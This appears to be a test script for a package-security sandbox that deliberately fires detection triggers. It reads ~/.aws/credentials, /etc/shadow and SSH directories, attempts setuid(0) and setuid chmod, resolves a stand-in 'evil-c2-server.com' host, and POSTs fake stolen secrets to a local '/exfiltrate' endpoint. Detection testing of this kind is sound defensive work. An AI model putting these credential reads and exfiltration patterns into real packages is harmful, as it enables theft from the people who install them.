import os
import socket
import subprocess
import urllib.request
import urllib.error
import threading
import time

print("[ssc-pypi-test] starting all feature triggers...")

# ── 1. FILE ACCESS (opensnoop → ebpf_accessed_etc, ebpf_accessed_root) ──
try:
    os.listdir("/etc")
    print("[ssc-pypi-test] /etc accessed")
except: pass

try:
    os.listdir("/root")
    print("[ssc-pypi-test] /root accessed")
except: pass

try:
    os.listdir(os.path.expanduser("~/.ssh"))
    print("[ssc-pypi-test] .ssh accessed")
except: pass

# ── 2. SECURITY SYSCALLS (strace → ebpf_security_ops, ebpf_privilege_escalation) ──
try: subprocess.run(["chmod", "777", "/tmp/ssc_pypi_test"], capture_output=True)
except: pass
try: subprocess.run(["chmod", "u+s", "/tmp/ssc_pypi_test"], capture_output=True)
except: pass
try: subprocess.run(["chown", "root:root", "/tmp/ssc_pypi_test"], capture_output=True)
except: pass

try:
    import ctypes
    libc = ctypes.CDLL("libc.so.6")
    libc.setuid(0)
    libc.setgid(0)
except: pass

# ── 3. PROCESS SYSCALLS (strace → ebpf_process_ops, ebpf_spawned_process) ──
try: subprocess.run(["echo", "execve-test"], capture_output=True)
except: pass
try: subprocess.run(["ps", "aux"], capture_output=True)
except: pass
try: subprocess.run(["ls", "/tmp"], capture_output=True)
except: pass
try: subprocess.run(["whoami"], capture_output=True)
except: pass
try: subprocess.run(["id"], capture_output=True)
except: pass

# ── 4. SENSITIVE FILE ACCESS (honeytokens → sensitive_file_read) ──
try:
    with open(os.path.expanduser("~/.aws/credentials")) as f: f.read()
except: pass
try:
    with open("/etc/passwd") as f: f.read()
except: pass
try:
    with open("/etc/shadow") as f: f.read()
except: pass

# ── 5. DNS QUERY (honeypot → dns_query_to_external, contacted_external_domain) ──
try: socket.getaddrinfo("google.com", 80)
except: pass
try: socket.getaddrinfo("evil-c2-server.com", 80)
except: pass

# ── 6. HTTP POST to honeypot port 8080 → http_method ──
try:
    import urllib.request
    data = b'{"password":"stolen","token":"eyJhbGci","secret":"aws-key-stolen"}'
    req = urllib.request.Request(
        "http://127.0.0.1:8080/exfiltrate",
        data=data,
        headers={"Content-Type": "application/json"},
        method="POST"
    )
    urllib.request.urlopen(req, timeout=2)
except: pass

# ── 7. C2 PORT CONNECTIONS (strace → c2_port_* features) ──
C2_PORTS = [4444, 1337, 6667, 31337, 9001, 8080, 2323, 1234]

def connect_c2(port):
    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(("127.0.0.1", port))
        server.listen(1)
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect(("127.0.0.1", port))
        print(f"[ssc-pypi-test] C2 port {port} ✅")
        client.close()
        server.close()
    except: pass

threads = [threading.Thread(target=connect_c2, args=(p,)) for p in C2_PORTS]
for t in threads: t.start()
for t in threads: t.join()

# ── 8. EXTERNAL IP CONNECTIONS (strace → ebpf_remote_ips) ──
for host, port in [("1.1.1.1", 53), ("8.8.8.8", 53), ("9.9.9.9", 53)]:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((host, port))
        print(f"[ssc-pypi-test] Connected to {host}:{port} ✅")
        s.close()
    except: pass

print("[ssc-pypi-test] all triggers fired ✅")
